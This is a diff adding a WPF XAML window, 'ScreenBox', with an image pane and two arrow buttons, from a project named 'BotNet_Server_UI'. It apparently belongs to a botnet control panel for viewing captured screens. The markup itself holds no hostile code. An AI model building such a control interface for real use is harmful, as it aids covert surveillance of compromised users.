@@ -1,0 +1,14 @@
+﻿<Window x:Class="BotNet_Server_UI.ScreenBox"
+        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
+        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
+        xmlns:d="http://schemas.microsoft.com/expression/blend/2008"
+        xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
+        xmlns:local="clr-namespace:BotNet_Server_UI"
+        mc:Ignorable="d"
+        Title="ScreenBox" Height="450" Width="800">
+    <Grid>
+        <Image x:Name="Image" HorizontalAlignment="Stretch" Margin="50,0,50,0" VerticalAlignment="Stretch" />
+        <Button Content="&lt;-" HorizontalAlignment="Left" VerticalAlignment="Stretch" Width="50"/>
+        <Button Content="-&gt;" HorizontalAlignment="Right" VerticalAlignment="Stretch" Width="50"/>
+    </Grid>
+</Window>
